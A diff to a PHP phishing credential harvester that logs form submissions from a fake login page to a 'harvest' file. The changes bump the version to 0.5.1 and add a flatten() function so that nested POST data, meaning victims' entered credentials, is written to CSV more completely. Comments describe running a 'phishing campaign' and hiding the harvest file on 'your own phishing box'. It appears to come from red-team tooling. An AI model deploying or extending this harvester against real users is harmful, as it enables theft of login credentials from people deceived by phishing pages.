@@ -40,7 +40,7 @@
      *  Jakub M. / unkn0w (https://github.com/unkn0w)
      *
      * Version:
-     *  v0.5
+     *  v0.5.1
      *
      * Changelog:
      *  - v0.1 - init
@@ -50,6 +50,7 @@
      *  - v0.4 - unkn0w have added redirection facility and improved nested POST arrays handling
      *  - v0.5 - unkn0w added support for $post_url variable to support pages that have separate 
      *              URLs for login form and login backend
+     *  - v0.5.1 - mgeeky: fixed issue with nested POST arrays by flattening it
     */
 
     try {
@@ -62,7 +63,7 @@
         // Filename for harvested data. For CSV logging method, the '.csv' fill be appended.
         // Remember to keep the filename not guessable, to avoid forceful browsing against your own
         // phishing box!
-        $harvest_filename = 'harvester_phishing_campaign_0123456789.txt';
+        $harvest_filename = 'harvester_phishing_campaign_0123456789abcdef.txt';
 
         // VERY IMPORTANT TO SET:
         //  This is target URL used for posting form (form's 'action' attribute value).
@@ -144,18 +145,20 @@
         }
 
         function collect_columns_array($arraylog) {
-            $columns = array();   
+            return array_keys(flatten($arraylog));
+        }
 
-            foreach($arraylog as $k => $v) {
-                if ( $k == 'meta' ) {
-                    foreach($arraylog[$k] as $k2 => $v2) {
-                        array_push($columns, $k2);
-                    }
-                } else {
-                    array_push($columns, $k);
+        function flatten($array, $prefix = '') {
+            $result = array();
+            foreach($array as $key=>$value) {
+                if(is_array($value)) {
+                    $result = $result + flatten($value, $prefix . $key . '.');
+                }
+                else {
+                    $result[$prefix . $key] = $value;
                 }
             }
-            return $columns;
+            return $result;
         }
 
         function log_file_init($arraylog) {
@@ -181,18 +184,11 @@
                 file_put_contents($harvest_filename, print_r($arraylog, true), FILE_APPEND); 
             }
             if ($log_format == 'both' || $log_format == 'csv' ) {
-                $columns = collect_columns_array($arraylog);
+                $flattenarray = flatten($arraylog);
                 $line = '';
-                foreach ($columns as $col) {
-                    if (array_key_exists($col, $arraylog['meta'])) {
-                        $line .= $arraylog['meta'][$col] . $csv_separator;
-                    } else {
-                        if (is_array($arraylog[$col])){ 
-                            foreach($arraylog[$col] as $kx=>$vx) $line .= "$vx" . $csv_separator;
-                        } else {
-                            $line .= $arraylog[$col] . $csv_separator;
-                        }
-                    }
+
+                foreach ($flattenarray as $k => $v) {
+                    $line .= $v . $csv_separator; 
                 }
 
                 $line = substr($line, 0, -strlen($csv_separator));
@@ -354,3 +350,4 @@
         redirector($redirect);
     }
 ?>
+
